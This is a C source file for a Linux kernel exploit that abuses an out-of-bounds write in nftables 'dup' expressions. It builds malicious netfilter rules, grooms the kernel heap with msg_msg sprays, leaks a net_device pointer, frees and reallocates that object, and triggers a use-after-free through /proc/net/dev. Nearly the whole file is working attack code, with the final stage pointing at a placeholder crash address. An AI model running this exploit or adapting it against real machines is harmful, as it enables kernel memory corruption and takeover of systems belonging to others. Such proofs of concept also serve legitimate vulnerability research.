#define _GNU_SOURCE
#include <arpa/inet.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include "libexp.h"

uint64_t net_device_addr = 0;
#define CRASH_ADDR 0xffffffffdeadbeef

void vuln(int oob_writes, int legit_writes) {
	// setup table
	struct nftnl_table *table = nftnl_table_alloc();
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, "x");
	nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

	// chain
	struct nftnl_chain *chain = nftnl_chain_alloc();
	nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "x");
	nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "y");
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_NETDEV_INGRESS);
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
	nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");
	nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");

	struct nftnl_rule *rule = nftnl_rule_alloc();
	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "x");
	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "y");

	struct nftnl_expr *exprs[128];
	int exprid = 0;

	exprs[exprid] = nftnl_expr_alloc("meta");
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_KEY, NFT_META_PROTOCOL);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_DREG, NFT_REG_1);
	nftnl_rule_add_expr(rule, exprs[exprid]);
	exprid++;

	exprs[exprid] = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
	nftnl_expr_set_u16(exprs[exprid], NFTNL_EXPR_CMP_DATA, 8);
	nftnl_rule_add_expr(rule, exprs[exprid]);
	exprid++;

	exprs[exprid] = nftnl_expr_alloc("payload");
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_OFFSET, 16);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_LEN, 4);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_DREG, NFT_REG_1);
	nftnl_rule_add_expr(rule, exprs[exprid]);
	exprid++;

	exprs[exprid] = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
	nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_DATA, 0x0200007f);
	nftnl_rule_add_expr(rule, exprs[exprid]);
	exprid++;

	// with these we can control the targeted kmalloc size
	for(int i = 0; i < legit_writes; i++) {
		exprs[exprid] = nftnl_expr_alloc("immediate");
		nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DREG, NFT_REG_1);
		nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DATA, 1);
		nftnl_rule_add_expr(rule, exprs[exprid]);
		exprid++;
		exprs[exprid] = nftnl_expr_alloc("dup");
		nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
		nftnl_rule_add_expr(rule, exprs[exprid]);
		exprid++;
	}

	// oob writes
	for (int unaccounted_dup = 0; unaccounted_dup < oob_writes; unaccounted_dup++) {
		exprs[exprid] = nftnl_expr_alloc("dup");
		nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
		nftnl_rule_add_expr(rule, exprs[exprid]);
		exprid++;
	}

	// serialize
	char buf[MNL_SOCKET_BUFFER_SIZE];

	struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	int seq = 0;

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	struct nlmsghdr *nlh;
	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_NETDEV, 0, seq++);
	nftnl_table_nlmsg_build_payload(nlh, table);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_NETDEV, NLM_F_CREATE, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, chain);

	mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_NETDEV, NLM_F_CREATE | NLM_F_APPEND, seq++);
	nftnl_rule_nlmsg_build_payload(nlh, rule);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		err(1, "mnl_socket_open");
	}

	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
		err(1, "mnl_socket_send");
	}
}

/* */

u64 leak_net_device()
{
	uint64_t leak;
	char payload[0x2000];
	char buffer[0x2000];
	struct msg_spray_t *sprays[0x100];
	memset(payload, 'A', sizeof(payload));

	// heap grooming
	for(int i=0; i<0x100; i++) {
		sprays[i] = msg_spray(payload, 0x1040, 64);
	}
	for(int i=0; i<0x100; i++) msgrcv(sprays[i]->msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
	defragment(0x80, 32);

	// trigger OOB
	vuln(1, 1);

	// search for the overwritten dev pointer
	for(int i=0; i<0x100; i++) {
		struct msg_spray_t *spray = sprays[i];
		while(spray) {
			for(int j=0; j<spray->num; j++) {
				msgrcv(spray->msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
				// hex_print(&buffer[0xfd0], 0x80);
				if(*(u64 *)&buffer[0xfd8] != 0x4141414141414141) return *(u64 *)&buffer[0xfd8];
			}
			spray = spray->next;
		}
	}

	return 0;
}

void free_netdevice()
{
	uint64_t leak;
	char payload[0x2000];
	char buffer[0x2000];
	struct msg_spray_t *sprays[0x100*42];
	memset(payload, 'A', sizeof(payload));

	// heap grooming
	for(int i=0; i<0x100*42; i++) {
		sprays[i] = msg_spray(payload, 0x90, 1);
	}
	for(int i=0; i<0x100*42; i+=42) msgrcv(sprays[i]->msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
	defragment(0xc0, 21);

	// trigger OOB
	vuln(6, 2);

	// search for the overwritten dev pointer
	for(int i=0; i<0x100*42; i++) {
		struct msg_spray_t *spray = sprays[i];
		while(spray) {
			for(int j=0; j<spray->num; j++) {
				msgrcv(spray->msgqid, buffer, 0x10, 0, MSG_NOERROR | IPC_NOWAIT);
				// if(*(u64 *)buffer != 0x4141414141414141) hex_print(buffer, 0x30);
				if(*(u64 *)buffer != 0x4141414141414141) return;
			}
			spray = spray->next;
		}
	}

	puts("Fail to free netdevice!");
	assert(0 != 0);
}

void spray_4k()
{
	char payload[0x1000];
	memset(payload, 0, sizeof(payload));
	memset(payload, 'A', 8); // make it a valid msg
	*(u64 *)&payload[0x1e0-0x28] = net_device_addr;
	*(u64 *)&payload[0x80-0x28] = CRASH_ADDR;
	msg_spray(payload, 0x1000-0x30, 0x100);
}

int main(int argc, char **argv)
{
	cleanup_msgs();
	set_cpu(0);
	setup_sandbox();
	init_univ_spray();

	/*
		1. Leak heap
	*/
	puts("[*] STEP 1: Leak net_device");
	net_device_addr = leak_net_device();
	printf("[+] net_device ptr: 0x%lx\n", net_device_addr);
	assert(net_device_addr != 0);

	/*
		2. Free net_device
	*/
	puts("\n[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device");
	free_netdevice();

	/*
		3. Reallocate net_device
	*/
	puts("\n[*] STEP 3: Spray kmalloc-4k using to realloc net_device");
	spray_4k();

	/*
		4. Trigger
	*/
	// struct stat buf;
	int fd = open("/proc/net/dev", O_RDONLY);
	char buf[0x100];
	read(fd, buf, sizeof(buf));

	// fstat(fd, &buf);
	// system("strace /sbin/ifconfig");
	return 0;
}
